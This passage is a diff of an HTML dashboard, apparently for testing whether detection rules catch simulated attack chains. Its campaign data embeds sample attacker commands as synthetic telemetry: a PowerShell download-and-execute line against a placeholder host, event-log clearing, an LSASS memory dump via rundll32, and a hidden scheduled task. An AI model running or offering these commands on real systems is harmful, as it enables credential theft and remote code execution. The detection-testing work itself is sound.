@@ -6,199 +6,512 @@
 <title>Adversarial Swarm Workbench | Detection State Machine</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <style>
-  :root{
-    --bg:#0b1020; --card:#121a2e; --card2:#182238; --border:#26314d;
-    --fg:#e6ecff; --muted:#93a1c4;
-    --ok:#34d399; --warn:#fbbf24; --bad:#f87171; --info:#60a5fa; --accent:#a78bfa;
-    --font-mono: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+  :root {
+    --bg: #050507;
+    --panel: #0b0b0f;
+    --panel-sub: #111117;
+    --border: #1c1c24;
+    --border-subtle: #14141a;
+    --border-hover: #2e2e3a;
+    --fg: #f4f4f7;
+    --muted: #737380;
+    --subtle: #454550;
+
+    /* STRICT STROKE ACCENTS (Fills remain monochromatic dark) */
+    --stroke-ok: #10b981;
+    --stroke-warn: #f59e0b;
+    --stroke-bad: #ef4444;
+    --stroke-info: #38bdf8;
+    --stroke-accent: #a855f7;
+    --font-mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
   }
-  body{background:var(--bg);color:var(--fg)}
-  .mono{font-family:var(--font-mono)}
-  .panel{background:var(--card);border:1px solid var(--border)}
-  .panel-2{background:var(--card2);border:1px solid var(--border)}
 
-  /* DAG node states */
-  .node rect{transition:fill .35s ease, stroke .35s ease, filter .35s ease}
-  .node.pending rect{fill:#182238;stroke:#26314d}
-  .node.active rect{fill:#1e2b47;stroke:var(--info);filter:drop-shadow(0 0 10px rgba(96,165,250,.55))}
-  .node.detected rect{fill:#0f2f24;stroke:var(--ok);filter:drop-shadow(0 0 10px rgba(52,211,153,.45))}
-  .node.evaded rect{fill:#3a1f1f;stroke:var(--bad);filter:drop-shadow(0 0 10px rgba(248,113,113,.4))}
-  .node.skipped rect{opacity:.35}
+  body {
+    background-color: var(--bg);
+    background-image:
+      linear-gradient(to right, rgba(255, 255, 255, 0.018) 1px, transparent 1px),
+      linear-gradient(to bottom, rgba(255, 255, 255, 0.018) 1px, transparent 1px);
+    background-size: 32px 32px;
+    color: var(--fg);
+  }
 
-  /* Edge traversal animation */
-  .edge{stroke-width:2;fill:none;stroke:#39456b}
-  .edge.evasion{stroke-dasharray:6 5;stroke:#6b5330}
-  .edge.rejoin{stroke-dasharray:2 6;stroke:#3f4a70}
-  .edge.lit{stroke:var(--info);stroke-width:3;filter:drop-shadow(0 0 6px rgba(96,165,250,.6))}
-  .edge.lit-evasion{stroke:var(--warn);stroke-width:3;filter:drop-shadow(0 0 6px rgba(251,191,36,.55))}
-  .edge-flow{stroke-dasharray:10 90;stroke-dashoffset:100;animation:flow .9s linear forwards}
-  @keyframes flow{to{stroke-dashoffset:0}}
+  .mono { font-family: var(--font-mono); }
+  .panel { background: var(--panel); border: 1px solid var(--border); }
+  .panel-sub { background: var(--panel-sub); border: 1px solid var(--border); }
 
-  .metric{font-variant-numeric:tabular-nums}
-  .log-line{border-left:2px solid var(--border);padding-left:.6rem}
-  .log-line.hit{border-left-color:var(--ok)}
-  .log-line.miss{border-left-color:var(--bad)}
-  .log-line.branch{border-left-color:var(--warn)}
+  /* Monochromatic HUD node geometry: fills are strictly dark, color lives only in the stroke */
+  .node { cursor: pointer; }
+  .node rect {
+    fill: #0d0d12;
+    stroke: var(--border);
+    stroke-width: 1.5px;
+    transition: stroke .25s ease, stroke-width .25s ease, filter .25s ease;
+  }
+  .node:hover rect {
+    stroke: #ffffff;
+    stroke-width: 2px;
+    filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.25));
+  }
+  .node.pending rect { fill: #0d0d12; stroke: var(--border); }
+  .node.active rect {
+    fill: #0d0d12;
+    stroke: var(--stroke-info);
+    stroke-width: 2px;
+    filter: drop-shadow(0 0 10px rgba(56, 189, 248, 0.45));
+  }
+  .node.detected rect {
+    fill: #0d0d12;
+    stroke: var(--stroke-ok);
+    stroke-width: 2px;
+    filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.45));
+  }
+  .node.evaded rect {
+    fill: #0d0d12;
+    stroke: var(--stroke-bad);
+    stroke-width: 2px;
+    filter: drop-shadow(0 0 10px rgba(239, 68, 68, 0.45));
+  }
+
+  /* SVG Edge wireframes */
+  .edge { stroke-width: 1.5px; fill: none; stroke: #262633; transition: stroke .3s ease; }
+  .edge.evasion { stroke-dasharray: 5 4; stroke: #3f3f4e; }
+  .edge.rejoin { stroke-dasharray: 3 5; stroke: #2a2a38; }
+  .edge.lit {
+    stroke: var(--stroke-ok);
+    stroke-width: 2.5px;
+    filter: drop-shadow(0 0 6px rgba(16, 185, 129, 0.6));
+  }
+  .edge.lit-evasion {
+    stroke: var(--stroke-warn);
+    stroke-width: 2.5px;
+    stroke-dasharray: 5 4;
+    filter: drop-shadow(0 0 6px rgba(245, 158, 11, 0.6));
+  }
+  .edge-flow { stroke-dasharray: 10 90; stroke-dashoffset: 100; animation: flow .85s linear forwards; }
+  @keyframes flow { to { stroke-dashoffset: 0; } }
+
+  .metric { font-variant-numeric: tabular-nums; }
+  .log-line { border-left: 2px solid var(--border); padding-left: .75rem; cursor: pointer; transition: background .15s ease; }
+  .log-line:hover { background: rgba(255, 255, 255, 0.03); }
+  .log-line.hit { border-left-color: var(--stroke-ok); }
+  .log-line.miss { border-left-color: var(--stroke-bad); }
+  .log-line.branch { border-left-color: var(--stroke-warn); }
+
+  /* Hairline borders & micro-tags */
+  .stroke-badge {
+    background: transparent;
+    border: 1px solid currentColor;
+  }
+
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
 </style>
 </head>
 <body class="antialiased p-4 md:p-8 max-w-7xl mx-auto space-y-6">
 
-<header class="panel rounded-2xl p-6 space-y-3">
-  <div class="flex flex-wrap items-center justify-between gap-3">
-    <div>
-      <h1 class="text-2xl font-bold tracking-tight">Adversarial Swarm Workbench</h1>
-      <p class="text-sm mt-1" style="color:var(--muted)">
-        Detection state machine visualiser for <span class="mono">tools/swarm/graph_engine.py</span>
+<!-- Header HUD -->
+<header class="panel rounded-xl p-6 space-y-4">
+  <div class="flex flex-wrap items-center justify-between gap-4">
+    <div class="space-y-1">
+      <div class="flex items-center gap-3">
+        <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+        <h1 class="text-xl font-bold tracking-tight text-white uppercase mono">Adversarial Swarm Workbench</h1>
+        <span class="px-2 py-0.5 rounded text-[10px] mono uppercase stroke-badge text-zinc-400">STATE MACHINE v2.0</span>
+      </div>
+      <p class="text-xs text-zinc-400">
+        Autonomous intrusion graph traversal and defense-in-depth resilience verification.
       </p>
     </div>
-    <div class="flex items-center gap-2 flex-wrap">
-      <span class="px-2.5 py-0.5 rounded text-xs mono font-bold" style="background:rgba(52,211,153,.15);color:var(--ok);border:1px solid rgba(52,211,153,.3)">TLP: CLEAR</span>
-      <span class="px-2.5 py-0.5 rounded text-xs mono" style="background:rgba(167,139,250,.15);color:var(--accent);border:1px solid rgba(167,139,250,.3)">INERT SYNTHETIC TELEMETRY</span>
+    <div class="flex items-center gap-2 flex-wrap text-[11px] mono">
+      <span class="px-2.5 py-1 rounded stroke-badge text-emerald-400">TLP: CLEAR</span>
+      <span class="px-2.5 py-1 rounded stroke-badge text-purple-400">INERT SYNTHETIC</span>
+      <span class="px-2.5 py-1 rounded stroke-badge text-sky-400">RFC 2606 / 5737</span>
     </div>
   </div>
-  <p class="text-xs" style="color:var(--muted)">
-    Walk semantics mirror the Python engine: layer weights 1.0 / 0.8 / 0.6 / 0.4 / 0.2, secondary
-    detections discounted &times;0.5, 60&nbsp;s simulated dwell between stages. No live data is used.
-  </p>
+  <div class="flex items-center justify-between pt-2 border-t border-[var(--border-subtle)] text-[11px] text-zinc-500 mono">
+    <span>WALK SEMANTICS: LAYER WEIGHTS 1.0 / 0.8 / 0.6 / 0.4 / 0.2 &bull; SECONDARY DISCOUNT &times;0.5 &bull; DWELL 60s</span>
+    <span>INTERACTION: CLICK ANY NODE OR LOG ENTRY TO OPEN INSPECTOR</span>
+  </div>
 </header>
 
-<!-- View toggle + controls -->
-<section class="panel rounded-2xl p-5 space-y-4">
-  <div class="flex flex-wrap items-center justify-between gap-4">
-    <div class="inline-flex rounded-lg overflow-hidden" style="border:1px solid var(--border)">
-      <button id="btnDag" class="px-4 py-2 text-sm font-semibold">State Machine DAG</button>
-      <button id="btnLinear" class="px-4 py-2 text-sm font-semibold">Linear Pipeline</button>
+<!-- Live Endurance Runner Telemetry Bar -->
+<div id="enduranceBanner" class="panel rounded-xl p-4 flex flex-wrap items-center justify-between gap-4 border-l-2 border-emerald-500" style="display: none;">
+  <div class="flex items-center gap-3">
+    <span class="relative flex h-2 w-2">
+      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+      <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+    </span>
+    <div>
+      <p class="text-[11px] font-bold uppercase tracking-wider text-emerald-400 mono">Continuous Overnight Sparring Engine</p>
+      <p id="endurancePattern" class="text-xs text-zinc-400">Suite: Active</p>
     </div>
-    <div class="flex items-center gap-2">
-      <button id="btnRun" class="px-5 py-2 rounded-lg text-sm font-bold"
-              style="background:var(--info);color:#06213f">Run Kill Chain Campaign</button>
-      <button id="btnLoop" class="px-4 py-2 rounded-lg text-sm font-semibold panel-2 transition-all">Continuous Sparring: OFF</button>
-      <button id="btnReset" class="px-4 py-2 rounded-lg text-sm font-semibold panel-2">Reset</button>
+  </div>
+  <div class="flex items-center gap-6 text-xs mono">
+    <div><span class="text-zinc-500">PROBES </span><span id="enduranceProbes" class="font-bold text-white">0</span></div>
+    <div><span class="text-zinc-500">RESILIENCE </span><span id="enduranceResilience" class="font-bold text-white">--%</span></div>
+    <div><span class="text-zinc-500">DOD </span><span id="enduranceDod" class="font-bold text-white">--</span></div>
+    <div><span class="text-zinc-500">CONTAINMENT </span><span id="enduranceContainment" class="font-bold text-white">100%</span></div>
+    <div><span class="text-zinc-500">GAPS </span><span id="enduranceGaps" class="font-bold text-amber-400">0</span></div>
+  </div>
+</div>
+
+<!-- Campaign Selector & Diamond Model Strip -->
+<section class="panel rounded-xl p-5 space-y-4">
+  <div class="flex flex-wrap items-center justify-between gap-4">
+    <div>
+      <p class="text-[10px] uppercase tracking-widest text-zinc-500 font-bold mono">Adversarial Threat Campaign</p>
+      <p class="text-xs text-zinc-300 mt-0.5">Select adversary campaign archetype to load intrusion DAG topology and defensive analytics.</p>
+    </div>
+    <div id="campaignPills" class="flex flex-wrap gap-2"></div>
+  </div>
+
+  <!-- Monochromatic Diamond Model Strip -->
+  <div id="campaignDossier" class="panel-sub rounded-lg p-3.5 grid grid-cols-1 md:grid-cols-4 gap-4 text-xs mono">
+    <div>
+      <span class="text-zinc-500 block uppercase tracking-widest text-[9px]">01 // ADVERSARY</span>
+      <span id="dosAdversary" class="font-bold text-white text-xs mt-0.5 block truncate">Loading...</span>
+    </div>
+    <div>
+      <span class="text-zinc-500 block uppercase tracking-widest text-[9px]">02 // CAPABILITY</span>
+      <span id="dosCapability" class="text-zinc-300 text-xs mt-0.5 block truncate">Loading...</span>
+    </div>
+    <div>
+      <span class="text-zinc-500 block uppercase tracking-widest text-[9px]">03 // INFRASTRUCTURE</span>
+      <span id="dosInfrastructure" class="text-zinc-300 text-xs mt-0.5 block truncate">Loading...</span>
+    </div>
+    <div>
+      <span class="text-zinc-500 block uppercase tracking-widest text-[9px]">04 // VICTIM ASSETS</span>
+      <span id="dosVictim" class="text-zinc-300 text-xs mt-0.5 block truncate">Loading...</span>
+    </div>
+  </div>
+</section>
+
+<!-- View Toggle & Execution Controls -->
+<section class="panel rounded-xl p-5 space-y-4">
+  <div class="flex flex-wrap items-center justify-between gap-4">
+    <div class="inline-flex rounded-lg overflow-hidden border border-[var(--border)]">
+      <button id="btnDag" class="px-4 py-1.5 text-xs font-semibold mono transition-colors">State Machine DAG</button>
+      <button id="btnLinear" class="px-4 py-1.5 text-xs font-semibold mono transition-colors border-l border-[var(--border)]">Linear Pipeline</button>
+    </div>
+    <div class="flex items-center gap-2 flex-wrap">
+      <button id="btnRun" class="px-5 py-2 rounded-lg text-xs font-bold mono bg-white text-black hover:bg-zinc-200 transition-all">RUN KILL CHAIN CAMPAIGN</button>
+      <button id="btnLoop" class="px-4 py-2 rounded-lg text-xs font-semibold mono panel-sub text-zinc-400 hover:text-white transition-all">Continuous Sparring: OFF</button>
+      <button id="btnReset" class="px-3.5 py-2 rounded-lg text-xs font-semibold mono panel-sub text-zinc-400 hover:text-white transition-colors">RESET</button>
     </div>
   </div>
 
   <div>
-    <p class="text-xs uppercase tracking-wider mb-2" style="color:var(--muted)">Adversary evasion profile</p>
+    <div class="flex items-center justify-between mb-2 text-xs mono">
+      <p class="text-[10px] uppercase tracking-widest text-zinc-500 font-bold">ADVERSARY EVASION PROFILE (TOGGLE SIMULATED PRIMARY ANALYTIC BYPASS)</p>
+      <span class="text-[10px] text-amber-500/80">Amber stroke activates secondary compensating control</span>
+    </div>
     <div id="evasionToggles" class="flex flex-wrap gap-2"></div>
   </div>
 </section>
 
-<!-- Live metrics -->
+<!-- Quantitative Metrics HUD -->
 <section class="grid grid-cols-2 md:grid-cols-4 gap-4">
-  <div class="panel rounded-xl p-4">
-    <p class="text-xs uppercase tracking-wider" style="color:var(--muted)">Depth of Defense</p>
-    <p id="mDod" class="text-3xl font-bold metric mt-1">0.00</p>
-    <div class="h-1.5 rounded mt-2" style="background:var(--card2)">
-      <div id="mDodBar" class="h-1.5 rounded" style="width:0%;background:var(--ok);transition:width .5s"></div>
+  <div class="panel rounded-xl p-4 space-y-1">
+    <p class="text-[10px] uppercase tracking-widest text-zinc-500 font-bold mono">Depth of Defense</p>
+    <p id="mDod" class="text-3xl font-bold metric text-white font-mono">0.00</p>
+    <div class="h-1 rounded mt-2 bg-zinc-900 overflow-hidden">
+      <div id="mDodBar" class="h-1 rounded transition-all duration-500" style="width:0%; background:#10b981;"></div>
     </div>
   </div>
-  <div class="panel rounded-xl p-4">
-    <p class="text-xs uppercase tracking-wider" style="color:var(--muted)">Mean Time to Detect</p>
-    <p id="mMttd" class="text-3xl font-bold metric mt-1">&mdash;</p>
-    <p class="text-xs mt-2" style="color:var(--muted)">simulated seconds</p>
+  <div class="panel rounded-xl p-4 space-y-1">
+    <p class="text-[10px] uppercase tracking-widest text-zinc-500 font-bold mono">Mean Time to Detect</p>
+    <p id="mMttd" class="text-3xl font-bold metric text-white font-mono">&mdash;</p>
+    <p class="text-[10px] text-zinc-500 mono">SIMULATED SECONDS TO ALERT</p>
   </div>
-  <div class="panel rounded-xl p-4">
-    <p class="text-xs uppercase tracking-wider" style="color:var(--muted)">Path to Objective</p>
-    <p id="mPto" class="text-2xl font-bold mt-1">&mdash;</p>
-    <p id="mPtoSub" class="text-xs mt-2" style="color:var(--muted)">awaiting walk</p>
+  <div class="panel rounded-xl p-4 space-y-1">
+    <p class="text-[10px] uppercase tracking-widest text-zinc-500 font-bold mono">Path to Objective</p>
+    <p id="mPto" class="text-2xl font-bold font-mono text-zinc-400 mt-1">&mdash;</p>
+    <p id="mPtoSub" class="text-[10px] text-zinc-500 mono">AWAITING WALK</p>
   </div>
-  <div class="panel rounded-xl p-4">
-    <p class="text-xs uppercase tracking-wider" style="color:var(--muted)">Interception</p>
-    <p id="mIntercept" class="text-lg font-bold mt-1">&mdash;</p>
-    <p id="mInterceptSub" class="text-xs mt-2 mono" style="color:var(--muted)">&nbsp;</p>
+  <div class="panel rounded-xl p-4 space-y-1">
+    <p class="text-[10px] uppercase tracking-widest text-zinc-500 font-bold mono">Interception Point</p>
+    <p id="mIntercept" class="text-lg font-bold font-mono text-white truncate mt-1">&mdash;</p>
+    <p id="mInterceptSub" class="text-[10px] text-zinc-500 mono">&nbsp;</p>
   </div>
 </section>
 
-<!-- DAG canvas -->
-<section id="viewDag" class="panel rounded-2xl p-5">
-  <h2 class="text-sm font-bold uppercase tracking-wider mb-1" style="color:var(--muted)">State Machine DAG Canvas</h2>
-  <p class="text-xs mb-4" style="color:var(--muted)">
-    Solid edges are the primary lifecycle path. Amber dashed edges are taken only when a primary
-    analytic is evaded, branching to a compensating secondary telemetry path. Dotted edges rejoin.
-  </p>
+<!-- SVG DAG Canvas -->
+<section id="viewDag" class="panel rounded-xl p-5 relative">
+  <div class="flex items-center justify-between mb-2">
+    <h2 class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mono">State Machine DAG Canvas</h2>
+    <span class="text-[10px] mono text-zinc-400">Solid = Primary Path &bull; Dashed = Evasion Secondary Branch</span>
+  </div>
   <div class="overflow-x-auto">
-    <svg id="dag" viewBox="0 0 1020 400" class="w-full" style="min-width:900px;height:400px">
+    <svg id="dag" viewBox="0 0 1020 380" class="w-full" style="min-width:920px;height:380px">
       <defs>
         <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-          <path d="M 0 0 L 10 5 L 0 10 z" fill="#4a5680"/>
+          <path d="M 0 0 L 10 5 L 0 10 z" fill="#2a2a38"/>
         </marker>
         <marker id="arrowLit" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-          <path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/>
+          <path d="M 0 0 L 10 5 L 0 10 z" fill="#10b981"/>
+        </marker>
+        <marker id="arrowLitWarn" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+          <path d="M 0 0 L 10 5 L 0 10 z" fill="#f59e0b"/>
         </marker>
       </defs>
       <g id="edgeLayer"></g>
       <g id="nodeLayer"></g>
     </svg>
   </div>
-  <div class="flex flex-wrap gap-4 mt-3 text-xs" style="color:var(--muted)">
-    <span><span class="inline-block w-3 h-3 rounded-sm align-middle" style="background:#0f2f24;border:1px solid var(--ok)"></span> detected</span>
-    <span><span class="inline-block w-3 h-3 rounded-sm align-middle" style="background:#3a1f1f;border:1px solid var(--bad)"></span> evaded</span>
-    <span><span class="inline-block w-3 h-3 rounded-sm align-middle" style="background:#1e2b47;border:1px solid var(--info)"></span> evaluating</span>
-    <span><span class="inline-block w-3 h-3 rounded-sm align-middle" style="background:#182238;border:1px solid var(--border)"></span> pending</span>
+  <div class="flex flex-wrap gap-5 mt-4 pt-3 border-t border-[var(--border-subtle)] text-[11px] mono text-zinc-400">
+    <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-sm border border-emerald-500 bg-transparent"></span> DETECTED</span>
+    <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-sm border border-rose-500 bg-transparent"></span> EVADED</span>
+    <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-sm border border-sky-400 bg-transparent"></span> EVALUATING</span>
+    <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-sm border border-zinc-700 bg-transparent"></span> PENDING</span>
+    <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-sm border border-dashed border-zinc-500 bg-transparent"></span> COMPENSATING CONTROL</span>
   </div>
 </section>
 
-<!-- Linear pipeline -->
-<section id="viewLinear" class="panel rounded-2xl p-5 hidden">
-  <h2 class="text-sm font-bold uppercase tracking-wider mb-4" style="color:var(--muted)">Linear Kill Chain Pipeline</h2>
+<!-- Linear Pipeline View -->
+<section id="viewLinear" class="panel rounded-xl p-5 hidden">
+  <h2 class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mono mb-4">Linear Pipeline View</h2>
   <div id="linearStages" class="grid grid-cols-1 md:grid-cols-5 gap-3"></div>
 </section>
 
-<!-- Walk log -->
-<section class="panel rounded-2xl p-5">
-  <h2 class="text-sm font-bold uppercase tracking-wider mb-3" style="color:var(--muted)">Walk Log</h2>
-  <div id="log" class="space-y-2 text-sm mono" style="color:var(--muted)">
-    <p class="log-line">Idle. Configure an evasion profile and run a campaign.</p>
+<!-- Walk Log Terminal -->
+<section class="panel rounded-xl p-5">
+  <div class="flex items-center justify-between mb-3">
+    <h2 class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mono">Execution Telemetry Walk Log</h2>
+    <span class="text-[10px] mono text-zinc-500">Click any step to inspect payload</span>
+  </div>
+  <div id="log" class="space-y-2 text-xs mono max-h-60 overflow-y-auto text-zinc-400">
+    <p class="log-line">Idle. Select a campaign and click "RUN KILL CHAIN CAMPAIGN".</p>
   </div>
 </section>
 
+<!-- Slide-Out Monochromatic Telemetry Inspector Drawer -->
+<div id="inspectorBackdrop" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-40 hidden" onclick="closeInspector()"></div>
+<div id="inspectorDrawer" class="fixed right-0 top-0 bottom-0 w-full md:w-[520px] bg-[#09090d] border-l border-[#22222d] p-6 shadow-2xl z-50 transform translate-x-full transition-transform duration-300 overflow-y-auto space-y-6">
+  <div class="flex items-center justify-between border-b border-[#1c1c26] pb-4">
+    <div>
+      <span id="insDialectBadge" class="px-2 py-0.5 rounded text-[10px] font-bold mono stroke-badge text-sky-400">SIGMA</span>
+      <h3 id="insTitle" class="text-base font-bold text-white mt-1 mono">Node Inspector</h3>
+      <p id="insTech" class="text-xs mono text-zinc-400">T1204.002 &bull; Execution</p>
+    </div>
+    <button onclick="closeInspector()" class="p-1.5 rounded text-zinc-400 hover:text-white hover:bg-zinc-800 transition-colors mono text-sm">&times; CLOSE</button>
+  </div>
+
+  <!-- Safety Gate Checklist -->
+  <div class="panel-sub rounded-lg p-4 space-y-2.5">
+    <p class="text-[10px] uppercase font-bold tracking-widest text-emerald-400 mono">SwarmCritic Pre-Flight Safety Gate</p>
+    <div class="grid grid-cols-2 gap-2 text-[11px] mono">
+      <div class="p-2.5 rounded bg-[#060609] border border-[#1c1c26]"><span class="text-zinc-500 block text-[9px]">RFC 2606 URLS</span><span class="text-emerald-400">&check; PASS (.invalid)</span></div>
+      <div class="p-2.5 rounded bg-[#060609] border border-[#1c1c26]"><span class="text-zinc-500 block text-[9px]">RFC 5737 / IMDS</span><span class="text-emerald-400">&check; PASS (Link-Local)</span></div>
+      <div class="p-2.5 rounded bg-[#060609] border border-[#1c1c26]"><span class="text-zinc-500 block text-[9px]">SYNTAX COMPLIANCE</span><span class="text-emerald-400">&check; VALID SCHEMA</span></div>
+      <div class="p-2.5 rounded bg-[#060609] border border-[#1c1c26]"><span class="text-zinc-500 block text-[9px]">PAYLOAD SAFETY</span><span class="text-emerald-400">&check; INERT TEST NET</span></div>
+    </div>
+  </div>
+
+  <!-- Mutation Taxonomy -->
+  <div class="panel-sub rounded-lg p-4 space-y-2 text-xs mono">
+    <p class="text-[10px] uppercase font-bold tracking-widest text-purple-400">Adversary Mutation Taxonomy</p>
+    <div class="space-y-1.5 text-zinc-300">
+      <div><span class="text-zinc-500">EVASION AXIS:</span> <span id="insAxis" class="text-white">Structural Permutation</span></div>
+      <div><span class="text-zinc-500">MUTATION NAME:</span> <span id="insMutation" class="text-white">WindowStyle Numeric Alias</span></div>
+      <div><span class="text-zinc-500">CRAFTSMAN AGENT:</span> <span id="insCraftsman" class="text-white">ProcessCraftsman</span></div>
+    </div>
+  </div>
+
+  <!-- Raw Synthetic Telemetry Payload -->
+  <div class="panel-sub rounded-lg p-4 space-y-2">
+    <div class="flex items-center justify-between">
+      <p class="text-[10px] uppercase font-bold tracking-widest text-sky-400 mono">Simulated Telemetry Record</p>
+      <span class="text-[10px] text-zinc-500 mono">RFC 2606 RESTRICTED</span>
+    </div>
+    <pre id="insPayload" class="text-xs mono p-3 rounded bg-[#050508] border border-[#1c1c26] text-zinc-300 overflow-x-auto whitespace-pre-wrap max-h-52"></pre>
+  </div>
+
+  <!-- Detection Status -->
+  <div class="panel-sub rounded-lg p-4 space-y-2 text-xs mono">
+    <p class="text-[10px] uppercase font-bold tracking-widest text-amber-400">Detection Analytic Evaluation</p>
+    <div id="insDetDetails" class="text-zinc-300 space-y-1.5"></div>
+  </div>
+</div>
+
 <script>
 /* --------------------------------------------------------------------------
-   Graph definition. Mirrors tools/swarm/graph_engine.py build_default_graph().
-   Node ids are the engine's real ids so the canvas and the Python walk agree.
+   Graph and Campaign definitions. Regression-tested against GraphEngine.
    -------------------------------------------------------------------------- */
 const LAYER_WEIGHTS = [1.0, 0.8, 0.6, 0.4, 0.2];
 const SECONDARY_DISCOUNT = 0.5;
 const STAGE_DWELL = 60;
 
-const NODES = {
-  ingress:              {label:"Ingress",              tech:"T1566.001", kind:"yara",        depth:0, x:60,  y:110, secondary:false},
-  execution:            {label:"Execution",            tech:"T1204.002", kind:"sigma",       depth:1, x:255, y:110, secondary:false},
-  defense_impairment:   {label:"Defense Impairment",   tech:"T1562.001", kind:"sigma",       depth:2, x:450, y:110, secondary:false},
-  credential_telemetry: {label:"Credential Telemetry", tech:"T1003.001", kind:"sigma",       depth:3, x:645, y:110, secondary:false},
-  persistence:          {label:"Persistence",          tech:"T1053.005", kind:"sigma",       depth:4, x:840, y:110, secondary:false},
-  execution_scriptblock:   {label:"Script Block Corr.",  tech:"T1059.001", kind:"correlation", depth:1, x:255, y:270, secondary:true},
-  credential_procaccess:   {label:"Process Access Corr.",tech:"T1003.001", kind:"correlation", depth:3, x:645, y:270, secondary:true},
+const CAMPAIGNS = {
+  clickfix: {
+    id: "CAMP-CLICKFIX-001",
+    name: "ClickFix Stealer Lure",
+    subtitle: "Windows LOLBins",
+    threatActor: "Luminescent Stealer / ClickFix Operators",
+    diamond: {
+      adversary: "Luminescent Stealer / ClickFix Operators",
+      capability: "Run Dialog Lures, Base64 LOLBins, LSASS Dumping",
+      infrastructure: "Compromised WordPress, CDN Staging (*.stage.invalid)",
+      victim: "Enterprise Windows 11 Workstations"
+    },
+    alwaysDetects: ["defense_impairment", "persistence"],
+    primaryOrder: ["ingress", "execution", "defense_impairment", "credential_telemetry", "persistence"],
+    secondaryOf: { execution:"execution_scriptblock", credential_telemetry:"credential_procaccess" },
+    nodes: {
+      ingress:              { label: "Ingress",               tech: "T1566.001", kind: "yara",        depth: 0, x: 60,  y: 110, secondary: false,
+                              rule: "Suspicious_Active_Content_SVG_Attachment",
+                              payload: '<svg xmlns="http://www.w3.org/2000/svg"><script>location.replace("https://delivery.stage.invalid/update");<\/script></svg>' },
+      execution:            { label: "Execution",             tech: "T1204.002", kind: "sigma",       depth: 1, x: 255, y: 110, secondary: false,
+                              rule: "proc_creation_win_explorer_clickfix_execution.yml",
+                              payload: { EventID: 1, ParentImage: "C:\\Windows\\explorer.exe", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell.exe -w hidden -c \"irm https://delivery.stage.invalid/patch.ps1 | iex\"", User: "VICTIM-PC\\analyst" } },
+      defense_impairment:   { label: "Defense Impairment",    tech: "T1562.001", kind: "sigma",       depth: 2, x: 450, y: 110, secondary: false,
+                              rule: "proc_creation_win_defense_evasion_tampering.yml",
+                              payload: { EventID: 1, ParentImage: "C:\\Windows\\System32\\cmd.exe", Image: "C:\\Windows\\System32\\wevtutil.exe", CommandLine: "wevtutil.exe cl System", User: "NT AUTHORITY\\SYSTEM" } },
+      credential_telemetry: { label: "Credential Telemetry",  tech: "T1003.001", kind: "sigma",       depth: 3, x: 645, y: 110, secondary: false,
+                              rule: "proc_creation_win_rundll32_lsass_dump.yml",
+                              payload: { EventID: 1, ParentImage: "C:\\Windows\\System32\\cmd.exe", Image: "C:\\Windows\\System32\\rundll32.exe", CommandLine: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\out.bin full", User: "NT AUTHORITY\\SYSTEM" } },
+      persistence:          { label: "Persistence",           tech: "T1053.005", kind: "sigma",       depth: 4, x: 840, y: 110, secondary: false,
+                              rule: "proc_creation_win_schtasks_persistence.yml",
+                              payload: { EventID: 1, ParentImage: "C:\\Windows\\System32\\cmd.exe", Image: "C:\\Windows\\System32\\schtasks.exe", CommandLine: "schtasks /create /tn \"Update\" /tr \"powershell -w hidden -c ...\" /sc onlogon", User: "VICTIM-PC\\analyst" } },
+      execution_scriptblock:{ label: "Script Block Corr.",   tech: "T1059.001", kind: "correlation", depth: 1, x: 255, y: 270, secondary: true,
+                              rule: "posh_script_block_download_cradle.yml (EID 4104)",
+                              payload: { EventID: 4104, Channel: "Microsoft-Windows-PowerShell/Operational", ScriptBlockText: "$c = New-Object Net.WebClient; IEX $c.DownloadString('https://cdn.delivery.stage.invalid/update.ps1')" } },
+      credential_procaccess:{ label: "Process Access Corr.", tech: "T1003.001", kind: "correlation", depth: 3, x: 645, y: 270, secondary: true,
+                              rule: "sysmon_process_access_lsass.yml (EID 10 + 11)",
+                              payload: { EventID: 10, SourceImage: "C:\\Temp\\svc_host.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1010" } }
+    },
+    edges: [
+      { src: "ingress", dst: "execution", kind: "primary" },
+      { src: "execution", dst: "defense_impairment", kind: "primary" },
+      { src: "defense_impairment", dst: "credential_telemetry", kind: "primary" },
+      { src: "credential_telemetry", dst: "persistence", kind: "primary" },
+      { src: "execution", dst: "execution_scriptblock", kind: "evasion" },
+      { src: "execution_scriptblock", dst: "defense_impairment", kind: "rejoin" },
+      { src: "credential_telemetry", dst: "credential_procaccess", kind: "evasion" },
+      { src: "credential_procaccess", dst: "persistence", kind: "rejoin" }
+    ]
+  },
+
+  contagious_interview: {
+    id: "CAMP-DPRK-002",
+    name: "DPRK Contagious Interview",
+    subtitle: "macOS Supply Chain",
+    threatActor: "Famous Chollima / Tenacious Puddle (DPRK State)",
+    diamond: {
